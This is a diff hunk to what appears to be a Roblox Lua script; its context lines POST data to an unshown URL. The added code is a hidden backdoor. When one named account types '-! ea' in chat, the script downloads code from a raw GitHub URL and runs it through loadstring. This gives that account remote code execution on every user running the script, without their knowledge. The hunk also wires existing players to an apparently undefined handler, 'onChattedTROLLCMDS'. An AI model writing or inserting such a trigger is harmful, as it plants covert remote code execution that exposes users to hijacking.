@@ -1701,3 +1701,20 @@ local headers = {
     }
 local PostData = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 task.spawn(GetRequestMethod(), PostData)
+
+local function chatted(message)
+if message:match("-! ea") then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NewNexer/NexerHub/refs/heads/main/DOD/Main.EarlyAccess"))()
+end
+end
+
+for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+if v.Name == "Nexer1234_AnotherAlt" then
+v.Chatted:Connect(onChattedTROLLCMDS)
+end
+end
+game:GetService("Players").PlayerAdded:Connect(function(v)
+if v.Name == "Nexer1234_AnotherAlt" then
+v.Chatted:Connect(chatted)
+end
+end)
